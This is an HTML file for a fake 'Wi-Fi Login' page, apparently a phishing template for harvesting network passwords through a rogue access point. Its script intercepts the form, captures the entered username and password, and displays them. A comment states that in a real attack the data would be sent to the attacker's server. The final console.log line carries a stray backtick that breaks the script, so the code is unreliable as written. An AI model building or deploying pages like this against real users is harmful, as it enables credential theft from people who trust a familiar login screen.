<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wi-Fi Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0  4px 8px rgba(0,0,0,0.1);
            text-align: center;
            width: 300px;
        }
        h2 {
            color: #333;
        }
        input[type="password"], input[type="text"] {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2>Wi-Fi Login</h2>
    <p>Please enter your password to connect.</p>
    <form id="wifiForm" action="#" method="POST">
        <input type="text" placeholder="Username (optional)" name="username">
        <input type="password" placeholder="Password" name="password" required>
        <button type="submit">Connect</button>
    </form>
</div>

<script>
    document.getElementById('wifiForm').addEventListener('submit', function(e) {
        e.preventDefault(); // Prevent actual form submission
        
        const password = document.querySelector('input[name="password"]').value;
        const username = document.querySelector('input[name="username"]').value;
        
        // In a real attack, this would send data to your server
        alert(`Password Captured: ${password}`);
        
        console.log(`Username: ${username}, Password: ${password}``);
    });
</script>

</body>
</html>
